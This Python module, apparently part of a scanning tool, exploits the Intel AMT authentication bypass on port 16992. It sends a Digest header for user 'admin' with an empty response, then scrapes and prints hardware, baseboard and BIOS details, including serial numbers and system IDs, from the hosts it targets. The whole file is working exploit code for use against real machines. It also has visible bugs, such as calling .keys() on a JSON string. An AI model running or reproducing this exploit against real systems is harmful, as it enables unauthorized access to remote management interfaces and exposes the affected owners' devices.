from builtins import str
import json
import socket
import re

import requests
from lxml import html

from lib.core.settings import (
    proxy_string_to_dict,
    logger, set_color,
    DEFAULT_USER_AGENT,
    replace_http
)
from var.auto_issue.github import request_issue_creation


def __get_auth_headers(target, port=16992, source=None, agent=None, proxy=None):
    if not source or 'WWW-Authenticate' not in source.headers['WWW-Authenticate']:
        logger.info(set_color(
            "header value not established, attempting to get bypass..."
        ))
        source = requests.get("http://{0}:{1}/index.htm".format(target, port), timeout=10, headers={
            'connection': 'close', 'user-agent': agent
        }, proxies=proxy)
        return source
    # Get digest and nonce and return the new header
    if 'WWW-Authenticate' in source.headers:
        logger.info(set_color(
            "header value established successfully, attempting authentication..."
        ))
        data = re.compile('Digest realm="Digest:(.*)", nonce="(.*)",stale="false",qop="auth"').search(
            source.headers['WWW-Authenticate'])
        digest = data.group(1)
        nonce = data.group(2)
        return 'Digest username="admin", ' \
               'realm="Digest:{0}", nonce="{1}", ' \
               'uri="/index.htm", response="", qop=auth, ' \
               'nc=00000001, cnonce="deadbeef"'.format(digest, nonce)
    else:
        logger.info(set_color(
            "nothing found, will skip URL..."
        ))
        return None


def __get_raw_data(target, page, agent=None, proxy=None):
    logger.info(set_color(
        "getting raw information..."
    ))
    return requests.get("http://{0}:16992/{1}.htm".format(target, page),
                        headers={
                            'connection': 'close',
                            'Authorization': __get_auth_headers(target),
                            'user-agent': agent
                        },
                        proxies=proxy
                        )


def __get_hardware(target, agent=None, proxy=None):
    req = __get_raw_data(target, 'hw-sys', agent=agent, proxy=proxy)
    if not req.status_code == 200:
        return None
    logger.info(set_color(
        "connected successfully getting hardware info..."
    ))
    tree = html.fromstring(req.content)
    raw = tree.xpath('//td[@class="r1"]/text()')
    bios_functions = tree.xpath('//td[@class="r1"]/table//td/text()')
    data = {
        'platform': {
            'model': raw[0],
            'manufacturer': raw[1],
            'version': raw[2],
            'serial': raw[4],
            'system_id': raw[5]
        },
        'baseboard': {
            'manufacturer': raw[6],
            'name': raw[7],
            'version': raw[8],
            'serial': raw[9],
            'tag': raw[10],
            'replaceable': raw[11]
        },
        'bios': {
            'vendor': raw[12],
            'version': raw[13],
            'date': raw[14],
            'functions': bios_functions
        }
    }
    return json.dumps(data)


def main_intel_amt(url, agent=None, proxy=None, **kwargs):
    do_ip_address = kwargs.get("do_ip", False)
    proxy = proxy_string_to_dict(proxy) or None
    agent = agent or DEFAULT_USER_AGENT
    if do_ip_address:
        logger.warning(set_color(
            "running against IP addresses may result in the targets refusing the connection...", level=30
        ))
        logger.info(set_color(
            "will run against IP address instead of hostname..."
        ))
        try:
            url = replace_http(url)
            url = socket.gethostbyname(url)
            logger.info(set_color(
                "discovered IP address {}...".format(url)
            ))
        except Exception as e:
            logger.error(set_color(
                "failed to gather IP address from hostname '{}', received an error '{}'. "
                "will just run against hostname...".format(url, e), level=40
            ))
            url = url
    logger.info(set_color(
        "attempting to connect to '{}' and get hardware info...".format(url)
    ))
    try:
        json_data = __get_hardware(url, agent=agent, proxy=proxy)
        if json_data is None:
            logger.error(set_color(
                "unable to get any information, skipping...", level=40
            ))
            pass
        else:
            print("-" * 40)
            for key in list(json_data.keys()):
                print("{}:".format(str(key).capitalize()))
                for item in json_data[key]:
                    print(" - {}: {}".format(item.capitalize(), json_data[key][item]))
            print("-" * 40)
    except requests.exceptions.ConnectionError as e:
        if "Max retries exceeded with url" in str(e):
            logger.error(set_color(
                "failed connection, target machine is actively refusing the connection, skipping...", level=40
            ))
            pass
        else:
            logger.error(set_color(
                "failed connection with '{}', skipping...", level=40
            ))
            pass
    except Exception as e:
        if "Temporary failure in name resolution" in str(e):
            logger.error(set_color(
                "failed to connect on '{}', skipping...".format(url), level=40
            ))
            pass
        else:
            logger.exception(set_color(
                "ran into exception '{}', cannot continue...".format(e)
            ))
            request_issue_creation()
